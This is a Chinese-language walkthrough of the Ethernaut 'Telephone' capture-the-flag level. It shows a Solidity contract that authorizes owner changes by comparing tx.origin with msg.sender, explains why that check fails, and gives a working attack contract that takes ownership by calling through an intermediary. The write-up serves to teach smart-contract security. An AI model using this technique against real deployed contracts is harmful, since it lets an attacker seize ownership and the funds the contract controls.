4_Telephone
==

本关要求
--

  1.Claim ownership of the contract below to complete this level.

合约代码
--

    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract Telephone {

      address public owner;

      constructor() public {
        owner = msg.sender;
      }

      function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
          owner = _owner;
        }
      }
    }
    
合约分析
--

查看<code>changeOwner</code>方法，当调用该方法时<code>tx.origin</code>的值不等于<code>msg.sender</code>，就能成功修改owner  

<code>tx.origin</code>是Solidity的一个全局变量，它遍历整个调用栈并返回最初发送调用（或事务）的帐户的地址，他与<code>msg.sender</code>的区别为：  
<code>tx.origin</code>等于初始调用合约或交易的地址
<code>msg.sender</code>等于当前调用合约或交易的地址  


攻击
--

编写攻击合约，通过接口调用的方式调用本关合约中的changeOwner方法。  

    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    interface TelephoneInterface {
        function changeOwner(address _owner) external;
    }

    contract TelephoneAttack{

        TelephoneInterface t_interface;

        constructor(address _addr) public {
            t_interface = TelephoneInterface(_addr);
        }

        function attack(address _attackaddr) public {
            t_interface.changeOwner(_attackaddr);
        }
    }
编译并部署攻击合约，部署地址填写本关合约地址  

查看当前owner和player的值  


使用攻击合约中的attack方法修改owner  
